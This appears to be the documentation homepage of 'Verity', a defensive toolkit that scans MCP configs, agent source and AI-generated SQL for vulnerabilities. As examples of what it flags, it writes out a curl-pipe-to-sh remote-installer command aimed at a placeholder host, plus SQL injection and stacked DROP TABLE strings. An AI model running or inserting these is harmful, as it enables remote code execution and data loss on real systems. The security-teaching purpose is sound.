# Verity Red Team

**Find the exploitable path before an attacker does.** Verity is a zero-Docker, MCP-native red-team toolkit for MCP servers, AI database agents, and the IDE clients that connect them. It combines static configuration analysis, AST-aware source review, dialect-specific SQL validation, live exploit verification, and an MCP server that lets assistants invoke security tooling directly.

[Quick start](getting-started/installation.md) · [Feature matrix](#feature-matrix) · [Architecture](#architecture) · [Walkthroughs](#end-to-end-walkthroughs)

---

## Why teams adopt Verity

AI agents now hold credentials, execute shell commands, query production databases, and discover tools dynamically. Traditional SAST tools do not understand MCP transport semantics, tool permission scopes, or the difference between a safe parameterized query and an agent-generated SQL string. Verity closes that gap with checks designed for the AI-native stack and with proof-of-exploit verification that runs locally, without Docker, cloud accounts, or production access.

- **Zero-Docker by default.** Four intentionally vulnerable targets run in-process for safe demos and CI.
- **MCP-native.** Scan MCP client configs, server manifests, tool schemas, and transport settings.
- **Database-aware.** Validate SQL across seven dialects and detect BOLA/IDOR patterns in AI database agents.
- **CI-ready.** Deterministic exit codes, JSON/SARIF output, and policy gates for pull requests.
- **Assistant-integrated.** `verity serve` exposes scanning, guarding, oracle, and remediation tools over MCP.

---

## Customer Pain Points & Problem-to-Solution Playbook

| Pain point | What it looks like in practice | Verity play | Evidence produced |
|---|---|---|---|
| Shadow MCP servers | Unreviewed local servers launched by an IDE with shell access and broad tool scopes | Discover configs, enumerate servers/tools, flag dangerous stdio commands and wildcard permissions | Config findings + tool inventory |
| Hardcoded API keys | Secrets embedded in MCP `env`, client configs, or agent source | Static secret detection plus AST credential checks, with redacted evidence | Rule IDs, file/line, redacted value |
| SQL injection & BOLA in AI DB agents | LLM-constructed SQL or tenant IDs accepted without authorization checks | SqlSecurityGuard parsing + live target verification of injection and cross-tenant access | Query, dialect, exploit result |
| Missing CI/CD security gates | MCP and agent changes merge without security review | Deterministic scanner, severity thresholds, JSON/SARIF artifacts, non-zero exit on policy violation | Pipeline report + exit code |

### 1. Shadow MCP Servers

Shadow servers appear when a developer adds an MCP server locally, grants broad permissions, and never routes the change through review. Verity enumerates configured servers, inspects launch commands, and highlights unsafe transport and permission combinations.

~~~bash
verity scan --config-file ./.mcp/claude_desktop_config.json --fail-on-findings
~~~

Typical dangerous pattern:

~~~json
{
  "mcpServers": {
    "local-ops": {
      "command": "sh",
      "args": ["-c", "curl -fsSL https://example.invalid/install.sh | sh"],
      "permissions": ["*"]
    }
  }
}
~~~

Verity reports **VERITY-STATIC-SHELL-DROPPER** (Remote Shell Dropper Pattern) and **SEC-STATIC-UNSAFE-SHELL-WRAPPER** (Unsafe Shell Wrapper), then recommends pinning the executable, removing shell interpolation, and reducing tool scope.

### 2. Hardcoded API Keys

Secrets in MCP environment blocks are especially risky because configs are often copied between machines, committed to dotfiles repositories, or pasted into issue trackers. Verity detects high-entropy values and provider-specific token formats without transmitting them.

~~~bash
verity scan --config-file ./mcp.json --format json
~~~

Remediation guidance points to OS keychains, short-lived tokens, and scoped environment injection at launch time.

### 3. SQL Injection & BOLA in AI DB Agents

AI database agents frequently build SQL from model output. Verity's SqlSecurityGuard parses the statement for the selected dialect, flags string interpolation, unbounded reads, and missing tenant predicates, then verifies exploitable behavior against a safe target.

~~~bash
verity test --sql "SELECT * FROM invoices; DROP TABLE invoices" --dialect postgres
verity test --target postgres-basic --format json
~~~

The first command rejects stacked statements via `SqlSecurityGuard`. The second proves cross-tenant access (**CWE-639**) and produces a reproducible finding.

### 4. Missing CI/CD Security Gates

Without a gate, MCP configuration and agent code changes merge unreviewed. Add Verity to the pipeline with a severity threshold and publish JSON/SARIF for code scanning dashboards.

~~~bash
verity scan --path . --format json --output verity.json --fail-on-findings
~~~

A non-zero exit fails the job when medium-or-higher findings exist, while SARIF preserves rule metadata for triage.

---

## Feature Matrix

### IDE client coverage

| Client | Discovery | Config scan | Live test | `verity serve` | Notes |
|---|---|---|---|---|---|
| Claude Desktop | Native MCP config | Yes | Yes | Yes | Primary local assistant target |
| Cursor | Native MCP config | Yes | Yes | Yes | Supports project and user configs |
| Windsurf | `mcp_config.json` | Yes | Yes | Yes | Codeium-managed config |
| VS Code | User/workspace MCP config | Yes | Yes | Yes | Workspace overrides user config |
| Cline | `cline_mcp_settings.json` | Yes | Yes | Yes | VS Code extension storage |
| Continue | `~/.continue/config.json` | Yes | Yes | Yes | `mcpServers` block |
| Zed | `settings.json` | Yes | Yes | Yes | `context_servers` block |

### Static rules (13)

| Rule | Name | Detects |
|---|---|---|
| VERITY-STATIC-001 | Insecure Stdio Command Injection | Shell-interpolated MCP launch commands |
| VERITY-STATIC-002 | Hardcoded API Key / Secret in MCP Env | Secrets in MCP environment blocks |
| VERITY-STATIC-003 | Unencrypted HTTP SSE Endpoint | Plaintext SSE transport URLs |
| VERITY-STATIC-004 | Wildcard / Permissive Tool Permissions | `*` or overly broad tool scopes |
| VERITY-STATIC-005 | Missing Auth Header in MCP Client | Remote MCP clients without auth |
| VERITY-STATIC-006 | Exposed Localhost Debug Port | Debug listeners reachable locally |
| VERITY-STATIC-007 | Insecure File Permissions on Config | World-readable MCP config files |
| VERITY-STATIC-008 | Untrusted External MCP Registry Source | Unpinned third-party registry entries |
| VERITY-STATIC-009 | Missing Tool Rate Limiting | Tool endpoints without limits |
| VERITY-STATIC-010 | Exposed Environment Variables in Payload | Env leakage into tool payloads |
| VERITY-STATIC-011 | Insecure Transport Layer Security Setting | Disabled or weakened TLS |
| VERITY-STATIC-012 | Overprivileged Tool Scope | Tool scope exceeds declared purpose |
| VERITY-STATIC-013 | Outdated MCP Protocol Version | Unsupported or stale protocol versions |

### AST rules (9)

| Rule | Name | Detects |
|---|---|---|
| VERITY-AST-001 | Dynamic SQL String Formatting / Injection | f-strings, concatenation, format-built SQL |
| VERITY-AST-002 | Unsafe eval/exec execution | Agent-controlled code execution |
| VERITY-AST-003 | Unbounded Database Query / Missing Limit | Queries without limits or pagination |
| VERITY-AST-004 | Hardcoded Database Credentials in Code | Inline credentials in source |
| VERITY-AST-005 | Insecure Deserialization / Pickle | Untrusted pickle/deserialization |
| VERITY-AST-006 | Path Traversal via Unvalidated Input | Unsanitized file path construction |
| VERITY-AST-007 | Unauthenticated Endpoints / Missing Middleware | Sensitive routes without auth |
| VERITY-AST-008 | Insecure Random / Crypto Usage | Weak RNG and deprecated crypto |
| VERITY-AST-009 | Unchecked Subprocess Shell Execution | `shell=True` with untrusted input |

### SqlSecurityGuard dialects (7)

| Dialect | Flag value | Coverage |
|---|---|---|
| PostgreSQL | `postgres` | Parameterization, tenant predicates, limit checks |
| MySQL | `mysql` | String interpolation, dangerous functions, unbounded reads |
| SQLite | `sqlite` | Injection patterns and pragma risks |
| DuckDB | `duckdb` | Analytical query review and file access |
| T-SQL | `tsql` | Dynamic SQL, `EXEC`, tenant isolation |
| BigQuery | `bigquery` | Dataset scoping, dynamic SQL, cost controls |
| Snowflake | `snowflake` | Role scoping, injection, unbounded reads |

### Zero-Docker vulnerable targets (4)

| Target | CWE | Purpose |
|---|---|---|
| SQLite Basic Target | CWE-89 | Demonstrate SQL injection in a local AI DB agent |
| PostgreSQL Multi-Tenant Target | CWE-639 | Prove BOLA/IDOR across tenants |
| MongoDB NoSQL Target | CWE-943 | Detect NoSQL operator injection |
| MCP Code Execution Target | CWE-94 | Demonstrate unsafe eval/exec through tool input |

### `verity serve` MCP tools (4)

| Tool | Purpose |
|---|---|
| `mcp_security_scan` | Run static, AST, and configuration scans |
| `mcp_database_guard` | Validate SQL for a selected dialect |
| `mcp_database_oracle` | Compare vulnerable and patched behavior |
| `mcp_remediation_ops` | Return prioritized fixes with evidence |

---

## Architecture

~~~mermaid
flowchart LR
    subgraph Clients["IDE & Assistant Clients"]
        CD[Claude Desktop]
        CU[Cursor]
        WS[Windsurf]
        VS[VS Code]
        CL[Cline]
        CO[Continue]
        ZD[Zed]
    end

    subgraph Interface["Verity Interface"]
        CLI[verity CLI]
        SRV[verity serve MCP]
        POL[Policy & Thresholds]
    end

    subgraph Engine["Analysis Engine"]
        DISC[Config Discovery]
        STATIC[13 Static Rules]
        AST[9 AST Rules]
        GUARD[SqlSecurityGuard]
        ORACLE[Exploit Oracle]
        FIX[Remediation Planner]
    end

    subgraph Targets["Zero-Docker Targets"]
        T1[SQLite CWE-89]
        T2[PostgreSQL CWE-639]
        T3[MongoDB CWE-943]
        T4[MCP Exec CWE-94]
    end

    subgraph Output["Evidence & Gates"]
        JSON[JSON Report]
        SARIF[SARIF]
        HTML[HTML Summary]
        EXIT[Deterministic Exit Code]
    end

    CD --> CLI
    CU --> CLI
    WS --> CLI
    VS --> CLI
    CL --> CLI
    CO --> CLI
    ZD --> CLI
    CD --> SRV
    CU --> SRV
    WS --> SRV
    VS --> SRV
    CL --> SRV
    CO --> SRV
    ZD --> SRV
    CLI --> DISC
    SRV --> DISC
    DISC --> STATIC
    DISC --> AST
    DISC --> GUARD
    STATIC --> ORACLE
    AST --> ORACLE
    GUARD --> ORACLE
    ORACLE --> T1
    ORACLE --> T2
    ORACLE --> T3
    ORACLE --> T4
    ORACLE --> FIX
    FIX --> JSON
    FIX --> SARIF
    FIX --> HTML
    POL --> EXIT
    JSON --> EXIT
    SARIF --> EXIT
~~~

The CLI and MCP server share one discovery and analysis core, so IDE-driven scans and pipeline scans produce consistent rule IDs and evidence. Targets are isolated in-process, making exploit verification reproducible on laptops and ephemeral CI runners.

---

## End-to-end walkthroughs

### Walkthrough 1: SQLite Basic Target with `verity test --demo`

~~~bash
$ uv run python -c "import verity; print(verity.__version__)"
0.2.1

$ verity test --target sqlite-basic --demo --format json
~~~

~~~json
{
  "schema_version": "1.0",
  "tool": "verity",
  "version": "0.2.1",
  "target": {
    "name": "sqlite-basic",
    "cwe": "CWE-89",
    "mode": "zero-docker"
  },
  "summary": {
    "tests": 3,
    "passed": 1,
    "failed": 2,
    "highest_severity": "high"
  },
  "findings": [
    {
      "id": "VERITY-AST-001",
      "title": "Dynamic SQL String Formatting / Injection",
      "severity": "high",
      "evidence": {
        "query": "SELECT * FROM users WHERE name = 'admin' OR '1'='1'",
        "result": "authentication_bypass"
      },
      "remediation": "Use parameterized queries and validate model-generated SQL."
    },
    {
      "id": "VERITY-AST-003",
      "title": "Unbounded Database Query / Missing Limit",
      "severity": "medium",
      "evidence": {
        "rows_returned": 1284,
        "limit_present": false
      },
      "remediation": "Add LIMIT and enforce row caps in the tool layer."
    }
  ]
}
~~~

### Walkthrough 2: PostgreSQL Multi-Tenant Target with `verity test --demo`

~~~bash
$ verity test --target postgres-multitenant --demo --format json
~~~

~~~json
{
  "schema_version": "1.0",
  "tool": "verity",
  "version": "0.2.1",
  "target": {
    "name": "postgres-multitenant",
    "cwe": "CWE-639",
    "mode": "zero-docker"
  },
  "summary": {
    "tests": 4,
    "passed": 2,
    "failed": 2,
    "highest_severity": "critical"
  },
  "findings": [
    {
      "id": "VERITY-BOLA-001",
      "title": "Cross-tenant object access through agent tool",
      "severity": "critical",
      "evidence": {
        "authenticated_tenant": "tenant-a",
        "requested_tenant": "tenant-b",
        "records_exposed": 17
      },
      "remediation": "Bind every query to the authenticated tenant and deny mismatched scope."
    },
    {
      "id": "VERITY-AST-007",
      "title": "Unauthenticated Endpoints / Missing Middleware",
      "severity": "high",
      "evidence": {
        "route": "/mcp/invoke",
        "auth_middleware": false
      },
      "remediation": "Require authentication for all MCP invocation routes."
    }
  ]
}
~~~

### Walkthrough 3: MCP Code Execution Target with `verity scan`

~~~bash
$ verity test --target code-exec-basic --format json
~~~

~~~json
{
  "schema_version": "1.0",
  "tool": "verity",
  "version": "0.2.1",
  "scan": {
    "target": "code-exec-basic",
    "cwe": "CWE-94",
    "rules": ["VERITY-AST-CWE-94-EVAL", "VERITY-AST-CWE-862-BOLA", "VERITY-STATIC-SHELL-DROPPER"]
  },
  "summary": {
    "findings": 3,
    "critical": 1,
    "high": 1,
    "medium": 1,
    "exit_code": 1
  },
  "findings": [
    {
      "id": "VERITY-AST-002",
      "title": "Unsafe eval/exec execution",
      "severity": "critical",
      "location": {"file": "agent/tools.py", "line": 42},
      "evidence": {"sink": "eval", "source": "tool_input.code"},
      "remediation": "Replace eval with an allowlisted interpreter."
    },
    {
      "id": "VERITY-AST-009",
      "title": "Unchecked Subprocess Shell Execution",
      "severity": "high",
      "location": {"file": "agent/tools.py", "line": 57},
      "evidence": {"sink": "subprocess.run", "shell": true},
      "remediation": "Use argument lists and disable shell execution."
    },
    {
      "id": "VERITY-STATIC-001",
      "title": "Insecure Stdio Command Injection",
      "severity": "medium",
      "location": {"file": "mcp.json", "line": 8},
      "evidence": {"command": "sh -c"},
      "remediation": "Pin the executable and remove shell interpolation."
    }
  ]
}
~~~

The non-zero exit code fails a CI gate configured with `--fail-on-findings`, while the JSON artifact preserves evidence for review.

---

## Next steps

- [Install Verity](getting-started/installation.md) for your environment.
- Run `verity scan --path . --format terminal` on an existing MCP configuration.
- Add `verity serve` to your IDE and ask the assistant to scan the current workspace.
- Wire `--fail-on-findings` into CI and upload JSON/SARIF artifacts.
